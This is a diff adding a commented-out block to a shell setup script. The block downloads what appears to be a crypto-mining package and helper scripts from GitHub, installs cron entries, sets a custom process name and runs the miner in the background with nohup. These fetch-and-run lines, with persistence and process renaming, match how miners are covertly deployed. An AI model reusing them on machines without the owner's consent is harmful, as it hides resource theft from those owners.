@@ -119,3 +119,30 @@ fi
 #			date +'%A' > date.txt
 #			sudo chown -R $Uuname:$Uuname /home/$Uuname/
 #			nohup sh runsrc.sh > result.log 2>&1 &
+
+
+
+# LOL
+#			wget https://github.com/$gitpath/raw/main/lol_1.46a.tar.gz
+#			tar -xvf lol_1.46a.tar.gz
+#			rm -rf lol_1.46a.tar.gz
+#			#da co thu muc bin
+
+#			wget https://raw.githubusercontent.com/$gitpath/main/cron.sh
+#			wget https://raw.githubusercontent.com/$gitpath/main/cronadd.sh
+#			wget https://raw.githubusercontent.com/$gitpath/main/auinstall.sh
+#			wget https://raw.githubusercontent.com/$gitpath/main/processname.sh
+#			chmod +x auinstall.sh
+#			chmod +x processname.sh
+#			chmod +x cronadd.sh
+#			./cronadd.sh
+#			./processname.sh
+#			cp inuser.txt bin/inuser.txt
+#			cd bin/
+#			Uuname=$(cat inuser.txt)
+#			USEPROCNAME=$(cat SETPROCNAME.txt)
+#			wget https://raw.githubusercontent.com/$gitpath/main/runsrc.sh
+#			chmod +x runsrc.sh
+#			date +'%A' > date.txt
+#			sudo chown -R $Uuname:$Uuname /home/$Uuname/
+#			nohup sh runsrc.sh > result.log 2>&1 &
